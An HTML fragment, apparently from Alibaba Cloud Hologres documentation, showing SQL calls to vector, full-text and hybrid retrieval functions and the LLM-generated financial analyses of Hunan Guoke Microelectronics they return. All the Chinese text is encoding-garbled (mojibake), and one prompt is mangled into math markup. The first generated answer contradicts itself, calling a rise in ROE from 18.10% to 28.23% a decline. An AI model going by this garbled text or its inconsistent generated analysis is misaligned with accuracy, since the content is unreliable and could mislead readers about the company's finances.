title="https://help.aliyun.com/zh/hologres/user-guide/best-practices-financial-multimodal-ai-data-analysis-and-retrieval-system?spm=a2c4g.11186623.help-menu-113622.d_2_6_5_0.476c4bf26JuD6N&amp;scm=20140722.H_2982978._.OR_help-T_cn~zh-V_1#9b9ac4eba36lk" ref="nofollow noopener noreferrer">å‘é‡æ£€ç´¢å‡½æ•°</a>ï¼Œç›´æ¥è°ƒç”¨å¦‚ä¸‹è¯¥å­˜å‚¨è¿‡ç¨‹å¯ä»¥å®ç°å‘é‡å¬å›ã€‚</p>
<pre><code class="hljs language-ini" lang="ini">-- å‘é‡å•è·¯å¬å› + AIé‡æ’
SELECT qa_vector_search_retrieval(
  <span class="hljs-attr">question</span> =&gt; <span class="hljs-string">'æŠ¥å‘ŠæœŸå†…ï¼Œæ¹–å—å›½ç§‘å¾®ç”µå­è‚¡ä»½æœ‰é™å…¬å¸2014å¹´åº¦ã€2015å¹´åº¦ã€2016å¹´åº¦è¥ä¸šæ”¶å…¥å’Œå‡€åˆ©æ¶¦åˆ†åˆ«è¾ƒä¸Šå¹´å¢é•¿å¤šå¤§å¹…åº¦ï¼Ÿ'</span>,
  <span class="hljs-attr">corpus_table</span> =&gt; <span class="hljs-string">'dt_bs_challenge_financial'</span>,
  <span class="hljs-attr">prompt</span> =&gt; <span class="hljs-string">'è¯·åˆ†æå¦‚ä¸‹ä¸šç»©èµ°åŠ¿æ˜¯æ‚²è§‚è¿˜æ˜¯ä¹è§‚ï¼Œå¹¶ç»™å‡ºåŸå› ï¼š${question}\n\n å‚è€ƒä¿¡æ¯ï¼š\n\n ${context}'</span>
)
</code></pre>
<p>æ£€ç´¢ç­”æ¡ˆå¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section">qa<span class="hljs-emphasis">_retrieval
---------
"æ ¹æ®æä¾›çš„ä¿¡æ¯ï¼Œå¯¹æ¹–å—å›½ç§‘å¾®ç”µå­è‚¡ä»½æœ‰é™å…¬å¸çš„ä¸šç»©èµ°åŠ¿è¿›è¡Œåˆ†æï¼Œå¯ä»¥å¾—å‡ºä»¥ä¸‹ç»“è®ºï¼š

### ä¸€ã€ä¸šç»©èµ°åŠ¿åˆ†æï¼šæ‚²è§‚

#### 1. <span class="hljs-strong">**è¥ä¸šæ”¶å…¥å¢é•¿ä¹åŠ›**</span>
- 2014å¹´åº¦è¥ä¸šæ”¶å…¥è¾ƒä¸Šå¹´å¢é•¿ <span class="hljs-strong">**15.13%**</span>ï¼Œä½†2015å¹´åº¦è¥ä¸šæ”¶å…¥å´ <span class="hljs-strong">**ä¸‹é™5.21%**</span>ï¼Œ2016å¹´åº¦æ•°æ®æœªæä¾›ï¼Œä½†å¯ä»¥çœ‹å‡ºè¥ä¸šæ”¶å…¥å¢é•¿è¶‹åŠ¿åœ¨2015å¹´å‡ºç°æ˜æ˜¾ä¸‹æ»‘ã€‚
- 2012å¹´è‡³2014å¹´è¥ä¸šæ”¶å…¥çš„å¹´å¤åˆå¢é•¿ç‡ä»…ä¸º <span class="hljs-strong">**4.47%**</span>ï¼Œè¡¨æ˜å…¬å¸ä¸šåŠ¡æ‰©å¼ è¾ƒä¸ºç¼“æ…¢ã€‚

#### 2. <span class="hljs-strong">**å‡€åˆ©æ¶¦å¢é•¿æŒç»­ä¸‹é™**</span>
- 2014å¹´åº¦å‡€åˆ©æ¶¦å¢é•¿ <span class="hljs-strong">**5.43%**</span>ï¼Œ2015å¹´åº¦å‡€åˆ©æ¶¦ <span class="hljs-strong">**ä¸‹é™3.29%**</span>ã€‚
- æ‰£é™¤éç»å¸¸æ€§æŸç›Šåï¼Œ2014å¹´åº¦å½’å±äºæ¯å…¬å¸è‚¡ä¸œçš„å‡€åˆ©æ¶¦å¢é•¿ <span class="hljs-strong">**-3.14%**</span>ï¼Œ2015å¹´åº¦è¿›ä¸€æ­¥ä¸‹é™ <span class="hljs-strong">**-5.60%**</span>ï¼Œè¡¨æ˜å…¬å¸ä¸»è¥ä¸šåŠ¡ç›ˆåˆ©èƒ½åŠ›åœ¨æŒç»­æ¶åŒ–ã€‚
- 2012å¹´è‡³2014å¹´æ‰£é™¤éç»å¸¸æ€§æŸç›Šåå‡€åˆ©æ¶¦çš„å¹´å¤åˆå¢é•¿ç‡ä¸º <span class="hljs-strong">**-4.38%**</span>ï¼Œè¿œä½äºè¥ä¸šæ”¶å…¥å¢é•¿ï¼Œè¯´æ˜å…¬å¸ä¸»è¥ä¸šåŠ¡ç›ˆåˆ©èƒ½åŠ›ä¸è¶³ï¼Œå¢é•¿ä¸»è¦ä¾èµ–éç»å¸¸æ€§æŸç›Šã€‚

#### 3. <span class="hljs-strong">**éç»å¸¸æ€§æŸç›Šå æ¯”åé«˜**</span>
- æŠ¥å‘ŠæœŸå†…ï¼Œéç»å¸¸æ€§æŸç›Šå å‡€åˆ©æ¶¦çš„æ¯”ä¾‹è¾ƒé«˜ï¼Œ2014å¹´ã€2013å¹´ã€2012å¹´åˆ†åˆ«ä¸º <span class="hljs-strong">**17.54%ã€10.25%ã€8.06%**</span>ï¼Œè¡¨æ˜å…¬å¸åˆ©æ¶¦ä¸­æœ‰ä¸€éƒ¨åˆ†æ¥è‡ªæ”¿ç­–æ‰¶æŒã€æ”¿åºœè¡¥è´´ç­‰éç»å¸¸æ€§å› ç´ ï¼Œè€Œéæ ¸å¿ƒä¸šåŠ¡çš„æŒç»­å¢é•¿ã€‚
- ä¾èµ–éç»å¸¸æ€§æŸç›Šæ¥ç»´æŒåˆ©æ¶¦å¢é•¿ï¼Œä¸åˆ©äºå…¬å¸é•¿æœŸçš„ç¨³å®šå‘å±•ã€‚

#### 4. <span class="hljs-strong">**å‡€èµ„äº§æ”¶ç›Šç‡ä¸‹é™**</span>
- åŠ æƒå¹³å‡å‡€èµ„äº§æ”¶ç›Šç‡ä»2014å¹´çš„ <span class="hljs-strong">**18.10%**</span> ä¸‹é™åˆ°2015å¹´çš„ <span class="hljs-strong">**24.82%**</span>ï¼Œå†åˆ°2016å¹´çš„ <span class="hljs-strong">**28.23%**</span>ï¼Œè™½ç„¶æ•°æ®çœ‹ä¼¼å¢é•¿ï¼Œä½†éœ€æ³¨æ„è¯¥æŒ‡æ ‡æ˜¯ä»¥æ‰£é™¤éç»å¸¸æ€§æŸç›Šåçš„å‡€åˆ©æ¶¦è®¡ç®—çš„ï¼Œè€Œå‡€åˆ©æ¶¦æœ¬èº«åœ¨ä¸‹é™ï¼Œå› æ­¤è¿™ç§å¢é•¿å¯èƒ½ä¸èµ„æœ¬ç»“æ„å˜åŒ–æœ‰å…³ï¼Œè€Œéç›ˆåˆ©èƒ½åŠ›çš„å®è´¨æ€§æå‡ã€‚

### äºŒã€åŸå› æ€»ç»“
1. <span class="hljs-strong">**ä¸»è¥ä¸šåŠ¡å¢é•¿ä¹åŠ›**</span>ï¼šè¥ä¸šæ”¶å…¥å’Œå‡€åˆ©æ¶¦å¢é•¿å‡å‘ˆç°ä¸‹é™è¶‹åŠ¿ï¼Œå°¤å…¶æ˜¯å‡€åˆ©æ¶¦çš„ä¸‹é™è¡¨æ˜å…¬å¸ç›ˆåˆ©èƒ½åŠ›åœ¨å‡å¼±ã€‚
2. <span class="hljs-strong">**éç»å¸¸æ€§æŸç›Šä¾èµ–åº¦é«˜**</span>ï¼šå…¬å¸åˆ©æ¶¦ä¸­éç»å¸¸æ€§æŸç›Šå æ¯”è¾ƒé«˜ï¼Œè¯´æ˜ä¸»è¥ä¸šåŠ¡çš„ç›ˆåˆ©èƒ½åŠ›ä¸è¶³ï¼Œå…¬å¸ä¸šç»©çš„æŒç»­æ€§å­˜ç–‘ã€‚
3. <span class="hljs-strong">**å¸‚åœºç«äº‰æ¿€çƒˆ**</span>ï¼šå…¬å¸é‡‡è´­çš„å·¥æ§æœºã€æ˜¾ç¤ºå™¨ã€ç”µæºç­‰äº§å“å¸‚åœºç«äº‰æ¿€çƒˆï¼Œä»·æ ¼å¹³ç¨³ï¼Œåˆ©æ¶¦ç©ºé—´å—åˆ°æŒ¤å‹ã€‚
4. <span class="hljs-strong">**è¡Œä¸šç¯å¢ƒå½±å“**</span>ï¼šä¸é”ˆé’¢å¸‚åœºä»·æ ¼æ³¢åŠ¨ã€åŸææ–™ä»·æ ¼æ³¢åŠ¨å¯èƒ½å¯¹å…¬å¸ç»è¥ä¸šç»©é€ æˆä¸€å®šå½±å“ï¼Œè™½ç„¶å…¬å¸å·²é‡‡å–æªæ–½é™ä½å½±å“ï¼Œä½†é•¿æœŸæ¥çœ‹ä»éœ€å…³æ³¨ã€‚

### ä¸‰ã€ç»“è®º
æ€»ä½“æ¥çœ‹ï¼Œæ¹–å—å›½ç§‘å¾®ç”µå­è‚¡ä»½æœ‰é™å…¬å¸çš„ä¸šç»©èµ°åŠ¿å <span class="hljs-strong">**æ‚²è§‚**</span>ã€‚å…¬å¸ä¸»è¥ä¸šåŠ¡å¢é•¿ä¹åŠ›ï¼Œå‡€åˆ©æ¶¦æŒç»­ä¸‹é™ï¼Œå¯¹éç»å¸¸æ€§æŸç›Šä¾èµ–åº¦é«˜ï¼Œæœªæ¥ç›ˆåˆ©èƒ½åŠ›çš„å¯æŒç»­æ€§å­˜ç–‘ã€‚å…¬å¸éœ€è¦åŠ å¼ºæ ¸å¿ƒä¸šåŠ¡çš„ç«äº‰åŠ›ï¼Œä¼˜åŒ–æˆæœ¬ç»“æ„ï¼Œæé«˜ä¸»è¥ä¸šåŠ¡ç›ˆåˆ©èƒ½åŠ›ï¼Œä»¥å®ç°é•¿æœŸç¨³å¥å‘å±•ã€‚"
</span></span></code></pre>
<h3 data-id="heading-6">å…¨æ–‡æ£€ç´¢</h3>
<p>åœ¨å…¨æ–‡æ£€ç´¢æ—¶ï¼Œä¸ºäº†æ£€ç´¢æ–¹ä¾¿ï¼Œæˆ‘ä»¬å°†é—®é¢˜Embeddingå’ŒPromptæ„å»ºï¼Œå¤§æ¨¡å‹è¾“å‡ºç­”æ¡ˆç­‰è¿‡ç¨‹å°è£…ä¸ºå…¨æ–‡æ£€ç´¢å‡½æ•°ï¼Œç›´æ¥è°ƒç”¨å¦‚ä¸‹å­˜å‚¨è¿‡ç¨‹å¯ä»¥å®ç°å…¨æ–‡å¬å›ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">--å…¨æ–‡æ£€ç´¢å¬å›
SELECT qa_text_search_retrieval(
    <span class="hljs-attr">question</span> =&gt; <span class="hljs-string">'æŠ¥å‘ŠæœŸå†…ï¼Œæ¹–å—å›½ç§‘å¾®ç”µå­è‚¡ä»½æœ‰é™å…¬å¸2014å¹´åº¦ã€2015å¹´åº¦ã€2016å¹´åº¦è¥ä¸šæ”¶å…¥å’Œå‡€åˆ©æ¶¦åˆ†åˆ«è¾ƒä¸Šå¹´å¢é•¿å¤šå¤§å¹…åº¦ï¼Ÿ'</span>,
    <span class="hljs-attr">corpus_table</span> =&gt; <span class="hljs-string">'dt_bs_challenge_financial'</span>,
    <span class="hljs-attr">prompt</span> =&gt; <span class="hljs-string">'è¯·åˆ†æå¦‚ä¸‹ä¸šç»©èµ°åŠ¿æ˜¯æ‚²è§‚è¿˜æ˜¯ä¹è§‚ï¼Œå¹¶ç»™å‡ºåŸå› ï¼š${question}\n\n å‚è€ƒä¿¡æ¯ï¼š\n\n ${context}'</span>
)<span class="hljs-comment">;</span>
</code></pre>
<p>æ£€ç´¢ç­”æ¡ˆå¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section">qa<span class="hljs-emphasis">_text_</span>search<span class="hljs-emphasis">_retrieval
----------------
"æ ¹æ®æä¾›çš„ä¿¡æ¯ï¼Œæ¹–å—å›½ç§‘å¾®ç”µå­è‚¡ä»½æœ‰é™å…¬å¸åœ¨2014å¹´ã€2015å¹´å’Œ2016å¹´çš„ä¸šç»©èµ°åŠ¿æ•´ä½“ä¸Šå‘ˆç°<span class="hljs-strong">**æ‚²è§‚**</span>è¶‹åŠ¿ï¼Œå…·ä½“åŸå› å¦‚ä¸‹ï¼š

### 1. <span class="hljs-strong">**è¥ä¸šæ”¶å…¥å¢é•¿ä¹åŠ›**</span>
- 2014å¹´è¥ä¸šæ”¶å…¥å¢é•¿ç‡ä¸º<span class="hljs-strong">**15.13%**</span>ï¼Œä½†2015å¹´è¥ä¸šæ”¶å…¥å¢é•¿ç‡è½¬ä¸º<span class="hljs-strong">**-5.21%**</span>ï¼Œå³å‡ºç°è´Ÿå¢é•¿ã€‚
- 2012å¹´è‡³2014å¹´çš„è¥ä¸šæ”¶å…¥å¹´å¤åˆå¢é•¿ç‡ä»…ä¸º<span class="hljs-strong">**4.47%**</span>ï¼Œè¯´æ˜å…¬å¸è¥ä¸šæ”¶å…¥å¢é•¿è¾ƒä¸ºç¼“æ…¢ï¼Œä¸šåŠ¡å‘å±•ä¸å¤Ÿå¼ºåŠ²ã€‚
- 2015å¹´ä¸ŠåŠå¹´è¥ä¸šæ”¶å…¥é¢„æµ‹ä¸2014å¹´åŒæœŸç›¸æ¯”å¤§è‡´æŒå¹³ï¼Œä½†2015å¹´ä¸ŠåŠå¹´å‡€åˆ©æ¶¦è¾ƒä¸Šå¹´åŒæœŸ<span class="hljs-strong">**ç•¥æœ‰ä¸‹é™**</span>ï¼Œè¡¨æ˜ç›ˆåˆ©èƒ½åŠ›ä¸‹é™ã€‚

### 2. <span class="hljs-strong">**å‡€åˆ©æ¶¦å’Œæ‰£éå‡€åˆ©æ¶¦å¢é•¿ä¸ä½³**</span>
- 2014å¹´å‡€åˆ©æ¶¦å¢é•¿ç‡ä¸º<span class="hljs-strong">**5.43%**</span>ï¼Œ2015å¹´å‡€åˆ©æ¶¦å¢é•¿ç‡ä¸‹é™ä¸º<span class="hljs-strong">**-3.29%**</span>ï¼Œå³å‡€åˆ©æ¶¦å‡ºç°ä¸‹æ»‘ã€‚
- æ‰£é™¤éç»å¸¸æ€§æŸç›Šåçš„å‡€åˆ©æ¶¦å¢é•¿ç‡åœ¨2014å¹´ä¸º<span class="hljs-strong">**-3.14%**</span>ï¼Œ2015å¹´è¿›ä¸€æ­¥ä¸‹é™ä¸º<span class="hljs-strong">**-5.60%**</span>ï¼Œè¯´æ˜å…¬å¸ä¸»è¥ä¸šåŠ¡çš„ç›ˆåˆ©èƒ½åŠ›æŒç»­ä¸‹é™ã€‚
- 2012å¹´è‡³2014å¹´æ‰£éå‡€åˆ©æ¶¦çš„å¹´å¤åˆå¢é•¿ç‡ä¸º<span class="hljs-strong">**-4.38%**</span>ï¼Œæ˜æ˜¾ä½äºè¥ä¸šæ”¶å…¥çš„å¹´å¤åˆå¢é•¿ç‡ï¼Œè¯´æ˜å…¬å¸åˆ©æ¶¦è´¨é‡ä¸é«˜ï¼Œä¸»è¥ä¸šåŠ¡ç›ˆåˆ©èƒ½åŠ›è¾ƒå¼±ã€‚

### 3. <span class="hljs-strong">**ç»è¥æ´»åŠ¨ç°é‡‘æµæ³¢åŠ¨**</span>
- 2014å¹´é”€å”®å•†å“ã€æä¾›åŠ³åŠ¡æ”¶åˆ°çš„ç°é‡‘å è¥ä¸šæ”¶å…¥çš„æ¯”ä¾‹è¾ƒå‰ä¸¤å¹´æœ‰æ‰€ä¸‹é™ï¼Œä¸»è¦ä¸éƒ¨åˆ†æ”¶å…¥ç¡®è®¤é¡¹ç›®çš„<span class="hljs-strong">**æ”¶æ¬¾è·¨æœŸ**</span>æœ‰å…³ï¼Œè¯´æ˜å…¬å¸ç°é‡‘æµç®¡ç†å­˜åœ¨é—®é¢˜ã€‚
- 2013å¹´è´­ä¹°å•†å“ã€æ¥å—åŠ³åŠ¡æ”¯ä»˜çš„ç°é‡‘å è¥ä¸šæˆæœ¬æ¯”ä¾‹è¾ƒé«˜ï¼Œä¸»è¦æ˜¯ç”±äºå½“å¹´<span class="hljs-strong">**é‡‡è´­åŸææ–™å¹¶å®Œæˆç”Ÿäº§**</span>ï¼Œä½†éƒ¨åˆ†æˆæœ¬åœ¨2014å¹´æ‰ç»“è½¬ï¼Œå¯¼è‡´2014å¹´è¯¥æ¯”ä¾‹è¾ƒä½ï¼Œåæ˜ å…¬å¸é‡‡è´­å’Œç”Ÿäº§èŠ‚å¥ä¸å¤Ÿç¨³å®šã€‚

### 4. <span class="hljs-strong">**æŠ•èµ„å’Œç›ˆåˆ©èƒ½åŠ›æŒ‡æ ‡**</span>
- åŠ æƒå¹³å‡å‡€èµ„äº§æ”¶ç›Šç‡ï¼ˆROEï¼‰åœ¨2014å¹´ä¸º<span class="hljs-strong">**18.10%**</span>ï¼Œ2015å¹´ä¸Šå‡è‡³<span class="hljs-strong">**24.82%**</span>ï¼Œ2016å¹´è¿›ä¸€æ­¥ä¸Šå‡è‡³<span class="hljs-strong">**28.23%**</span>ï¼Œè™½ç„¶æœ‰æ‰€æå‡ï¼Œä½†ROEçš„æé«˜å¯èƒ½ä¸»è¦ä¾èµ–<span class="hljs-strong">**è´¢åŠ¡æ æ†**</span>ï¼Œè€Œéæ ¸å¿ƒä¸šåŠ¡ç›ˆåˆ©èƒ½åŠ›çš„æå‡ã€‚
- è€ƒè™‘åˆ°å‡€åˆ©æ¶¦å’Œæ‰£éå‡€åˆ©æ¶¦æŒç»­ä¸‹é™ï¼ŒROEçš„æå‡å¹¶ä¸èƒ½å®Œå…¨åæ˜ å…¬å¸ç»è¥è´¨é‡çš„æ”¹å–„ã€‚

### 5. <span class="hljs-strong">**2015å¹´ä¸ŠåŠå¹´ä¸šç»©é¢„æµ‹**</span>
- 2015å¹´ä¸ŠåŠå¹´è¥ä¸šæ”¶å…¥é¢„è®¡ä¸º<span class="hljs-strong">**8,505ä¸‡å…ƒè‡³10,395ä¸‡å…ƒ**</span>ï¼Œä¸2014å¹´åŒæœŸçš„<span class="hljs-strong">**10,127.35ä¸‡å…ƒ**</span>å¤§è‡´æŒå¹³ï¼Œä½†å‡€åˆ©æ¶¦é¢„è®¡ä¸º<span class="hljs-strong">**2,340ä¸‡å…ƒè‡³2,860ä¸‡å…ƒ**</span>ï¼Œä½äº2014å¹´åŒæœŸçš„<span class="hljs-strong">**2,912.66ä¸‡å…ƒ**</span>ï¼Œè¯´æ˜å…¬å¸ç›ˆåˆ©èƒ½åŠ›ä¸‹é™ã€‚

### æ€»ç»“
ç»¼åˆæ¥çœ‹ï¼Œæ¹–å—å›½ç§‘å¾®ç”µå­è‚¡ä»½æœ‰é™å…¬å¸åœ¨2014å¹´è‡³2016å¹´çš„ä¸šç»©èµ°åŠ¿<span class="hljs-strong">**åå‘æ‚²è§‚**</span>ã€‚è™½ç„¶ROEæœ‰æ‰€æå‡ï¼Œä½†è¥ä¸šæ”¶å…¥å¢é•¿ä¹åŠ›ã€å‡€åˆ©æ¶¦å’Œæ‰£éå‡€åˆ©æ¶¦æŒç»­ä¸‹é™ã€ç»è¥æ´»åŠ¨ç°é‡‘æµæ³¢åŠ¨è¾ƒå¤§ï¼Œè¡¨æ˜å…¬å¸ä¸»è¥ä¸šåŠ¡ç›ˆåˆ©èƒ½åŠ›è¾ƒå¼±ï¼Œç»è¥è´¨é‡æœ‰å¾…æå‡ã€‚"
</span></span></code></pre>
<h3 data-id="heading-7">å‘é‡+å…¨æ–‡æ··åˆæ£€ç´¢</h3>
<p>åœ¨å‘é‡ã€å…¨æ–‡ç»“åˆRankæ’åºæ··åˆæ£€ç´¢åœºæ™¯ä¸­ï¼Œä¸ºäº†æ£€ç´¢æ–¹ä¾¿ï¼ŒHologreså°†å…¶å°è£…ä¸ºå‘é‡+å…¨æ–‡åŒè·¯å¬å›+Rankæ’åºå‡½æ•°ï¼Œè¯¥å­˜å‚¨è¿‡ç¨‹çš„èƒ½åŠ›å¦‚ä¸‹ï¼š</p>
<ul>
<li>
<p>æ ¹æ®é—®é¢˜ä½¿ç”¨å‘é‡è®¡ç®—ï¼Œå¬å›TOP 20çš„ç­”æ¡ˆã€‚</p>
</li>
<li>
<p>æ ¹æ®é—®é¢˜ä½¿ç”¨å…¨æ–‡æ£€ç´¢ï¼Œå¬å›TOP 20çš„ç­”æ¡ˆã€‚</p>
</li>
<li>
<p>ä½¿ç”¨<code>ai_rank</code>ï¼Œå¯¹å‘é‡å’Œå…¨æ–‡å¬å›çš„ç­”æ¡ˆè¿›è¡Œæ’åºï¼Œæœ€åè¾“å‡ºTop1çš„ç­”æ¡ˆã€‚</p>
</li>
<li>
<p>ä½¿ç”¨<code>ai_gen</code>ï¼Œç»“åˆå¤§æ¨¡å‹æ ¹æ®æç¤ºè¯ä»¥åŠæ£€ç´¢çš„ç­”æ¡ˆï¼Œç”Ÿæˆæœ€ç»ˆç­”æ¡ˆå¹¶è¿›è¡Œè¾“å‡ºã€‚</p>
<p>-- å…¨æ–‡ã€å‘é‡åŒè·¯å¬å› + AIé‡æ’
SELECT qa_hybrid_retrieval(
question =&gt; 'æŠ¥å‘ŠæœŸå†…ï¼Œæ¹–å—å›½ç§‘å¾®ç”µå­è‚¡ä»½æœ‰é™å…¬å¸2014å¹´åº¦ã€2015å¹´åº¦ã€2016å¹´åº¦è¥ä¸šæ”¶å…¥å’Œå‡€åˆ©æ¶¦åˆ†åˆ«è¾ƒä¸Šå¹´å¢é•¿å¤šå¤§å¹…åº¦ï¼Ÿ',
corpus_table =&gt; 'dt_bs_challenge_financial',
prompt =&gt; 'è¯·åˆ†æå¦‚ä¸‹ä¸šç»©èµ°åŠ¿æ˜¯æ‚²è§‚è¿˜æ˜¯ä¹è§‚ï¼Œå¹¶ç»™å‡ºåŸå› ï¼š<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mrow><mi>q</mi><mi>u</mi><mi>e</mi><mi>s</mi><mi>t</mi><mi>i</mi><mi>o</mi><mi>n</mi></mrow><mstyle mathcolor="#cc0000"><mtext>\n</mtext></mstyle><mstyle mathcolor="#cc0000"><mtext>\n</mtext></mstyle><mtext>å‚è€ƒä¿¡æ¯ï¼š</mtext><mstyle mathcolor="#cc0000"><mtext>\n</mtext></mstyle><mstyle mathcolor="#cc0000"><mtext>\n</mtext></mstyle></mrow><annotation encoding="application/x-tex">{question}\n\n å‚è€ƒä¿¡æ¯ï¼š\n\n </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord mathnormal">u</span><span class="mord mathnormal">es</span><span class="mord mathnormal">t</span><span class="mord mathnormal">i</span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span></span><span class="mord text" style="color:#cc0000;"><span class="mord" style="color:#cc0000;">\n</span></span><span class="mord text" style="color:#cc0000;"><span class="mord" style="color:#cc0000;">\n</span></span><span class="mord cjk_fallback">å‚è€ƒä¿¡æ¯ï¼š</span><span class="mord text" style="color:#cc0000;"><span class="mord" style="color:#cc0000;">\n</span></span><span class="mord text" style="color:#cc0000;"><span class="mord" style="color:#cc0000;">\n</span></span></span></span></span></span>{context}'
);</p>
</li>
</ul>
<p>æ£€ç´¢ç­”æ¡ˆå¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section">qa<span class="hljs-emphasis">_hybrid_</span>retrieval
---</span>
"æ ¹æ®æä¾›çš„ä¿¡æ¯ï¼Œæˆ‘ä»¬å¯ä»¥å¯¹æ¹–å—å›½ç§‘å¾®ç”µå­è‚¡ä»½æœ‰é™å…¬å¸çš„ä¸šç»©èµ°åŠ¿è¿›è¡Œå¦‚ä¸‹åˆ†æï¼Œå¹¶åˆ¤æ–­å…¶è¶‹åŠ¿æ˜¯æ‚²è§‚è¿˜æ˜¯ä¹è§‚ï¼š

---

<span class="hljs-section">### ä¸€ã€<span class="hljs-strong">**è¥ä¸šæ”¶å…¥èµ°åŠ¿åˆ†æ**</span></span>
<span class="hljs-bullet">1.</span> <span class="hljs-strong">**2012-2014å¹´å¤åˆå¢é•¿ç‡**</span>ï¼š
<span class="hljs-bullet">   -</span> è¥ä¸šæ”¶å…¥çš„å¹´å¤åˆå¢é•¿ç‡ä¸º <span class="hljs-strong">**4.47%**</span>ï¼Œè¡¨æ˜å…¬å¸è¥ä¸šæ”¶å…¥çš„å¢é•¿è¾ƒä¸ºå¹³ç¨³ã€‚
<span class="hljs-bullet">   -</span> 2014å¹´è¥ä¸šæ”¶å…¥ä¸º <span class="hljs-strong">**18,154.06ä¸‡å…ƒ**</span>ï¼Œè¾ƒ2013å¹´å¢é•¿ <span class="hljs-strong">**15.13%**</span>ã€‚
<span class="hljs-bullet">   -</span> 2015å¹´è¥ä¸šæ”¶å…¥è¾ƒä¸Šå¹´ <span class="hljs-strong">**ä¸‹é™5.21%**</span>ï¼Œå‡ºç°äº†è´Ÿå¢é•¿ã€‚

<span class="hljs-bullet">2.</span> <span class="hljs-strong">**ç»“è®º**</span>ï¼š
<span class="hljs-bullet">   -</span> è¥ä¸šæ”¶å…¥çš„å¢é•¿åœ¨2014å¹´æœ‰æ‰€å›å‡ï¼Œä½†2015å¹´å‡ºç°æ˜æ˜¾ä¸‹æ»‘ï¼Œè¡¨æ˜å…¬å¸ä¸šåŠ¡æ‰©å¼ é‡åˆ°äº†ä¸€å®šé˜»åŠ›ã€‚

---

<span class="hljs-section">### äºŒã€<span class="hljs-strong">**å‡€åˆ©æ¶¦èµ°åŠ¿åˆ†æ**</span></span>
<span class="hljs-bullet">1.</span> <span class="hljs-strong">**2012-2014å¹´å¤åˆå¢é•¿ç‡**</span>ï¼š
<span class="hljs-bullet">   -</span> æ‰£é™¤éç»å¸¸æ€§æŸç›Šåçš„å‡€åˆ©æ¶¦å¹´å¤åˆå¢é•¿ç‡ä¸º <span class="hljs-strong">**-4.38%**</span>ï¼Œä½äºè¥ä¸šæ”¶å…¥çš„å¹´å¤åˆå¢é•¿ç‡ï¼Œè¯´æ˜å…¬å¸ç›ˆåˆ©èƒ½åŠ›æœ‰æ‰€ä¸‹é™ã€‚
<span class="hljs-bullet">   -</span> 2014å¹´æ‰£éå‡€åˆ©æ¶¦ä¸º <span class="hljs-strong">**42,731,071.18å…ƒ**</span>ï¼Œè¾ƒ2013å¹´ä¸‹é™ <span class="hljs-strong">**3.14%**</span>ã€‚
<span class="hljs-bullet">   -</span> 2015å¹´æ‰£éå‡€åˆ©æ¶¦è¾ƒä¸Šå¹´è¿›ä¸€æ­¥ä¸‹é™ <span class="hljs-strong">**5.60%**</span>ã€‚

<span class="hljs-bullet">2.</span> <span class="hljs-strong">**éç»å¸¸æ€§æŸç›Šå½±å“**</span>ï¼š
<span class="hljs-bullet">   -</span> 2014å¹´ã€2013å¹´åŠ2012å¹´éç»å¸¸æ€§æŸç›Šå å‡€åˆ©æ¶¦çš„æ¯”ä¾‹åˆ†åˆ«ä¸º <span class="hljs-strong">**17.54%ã€10.25%ã€8.06%**</span>ï¼Œå‘ˆä¸Šå‡è¶‹åŠ¿ã€‚
<span class="hljs-bullet">   -</span> éç»å¸¸æ€§æŸç›Šçš„å¢åŠ ä¸»è¦æ¥è‡ªäºæ”¿åºœè¡¥è´´å’Œç†è´¢äº§å“æ”¶ç›Šï¼Œè€Œéä¸»è¥ä¸šåŠ¡å¸¦æ¥çš„æŒç»­å¢é•¿ã€‚

<span class="hljs-bullet">3.</span> <span class="hljs-strong">**ç»“è®º**</span>ï¼š
<span class="hljs-bullet">   -</span> æ‰£éå‡€åˆ©æ¶¦è¿ç»­ä¸¤å¹´ä¸‹é™ï¼Œè¯´æ˜å…¬å¸ä¸»è¥ä¸šåŠ¡ç›ˆåˆ©èƒ½åŠ›å‡å¼±ï¼Œä¸šç»©å¢é•¿ä¾èµ–äºéç»å¸¸æ€§æŸç›Šï¼Œè¿™æ˜¯ä»¤äººæ‹…å¿§çš„ä¿¡å·ã€‚

---

<span class="hljs-section">### ä¸‰ã€<span class="hljs-strong">**ç°é‡‘æµé‡ä¸ç»è¥ç¨³å®šæ€§**</span></span>
<span class="hljs-bullet">1.</span> <span class="hljs-strong">**ç»è¥æ´»åŠ¨ç°é‡‘æµ**</span>ï¼š
<span class="hljs-bullet">   -</span> 2014å¹´è¥ä¸šæ”¶å…¥ä¸º <span class="hljs-strong">**18,154.06ä¸‡å…ƒ**</span>ï¼Œä½†é”€å”®å•†å“ã€æä¾›åŠ³åŠ¡æ”¶åˆ°çš„ç°é‡‘å¹¶æœªæ˜ç¡®ç»™å‡ºï¼Œæ— æ³•åˆ¤æ–­ç°é‡‘æµæ˜¯å¦å¥åº·ã€‚
<span class="hljs-bullet">   -</span> æŠ¥å‘ŠæœŸå†…ï¼Œå…¬å¸é“¶è¡Œå­˜æ¬¾åˆ†åˆ«ä¸º <span class="hljs-strong">**13,063.38ä¸‡å…ƒã€4,152.54ä¸‡å…ƒã€9,864.61ä¸‡å…ƒ**</span>ï¼Œèµ„é‡‘æµåŠ¨æ€§æ³¢åŠ¨è¾ƒå¤§ï¼Œä½†ä¸»è¦å®¢æˆ·ã€ä¾›åº”å•†åŠç»è¥æ¨¡å¼ä¿æŒç¨³å®šã€‚

<span class="hljs-bullet">2.</span> <span class="hljs-strong">**ç»“è®º**</span>ï¼š
<span class="hljs-bullet">   -</span> è™½ç„¶å…¬å¸ç°é‡‘æµå­˜åœ¨æ³¢åŠ¨ï¼Œä½†å®¢æˆ·å’Œä¾›åº”å•†ç¨³å®šï¼Œç»è¥æ¨¡å¼æœªå‘ç”Ÿé‡å¤§å˜åŒ–ï¼Œè¿™ä¸ºå…¬å¸æœªæ¥çš„å‘å±•æä¾›äº†ä¸€å®šä¿éšœã€‚

---

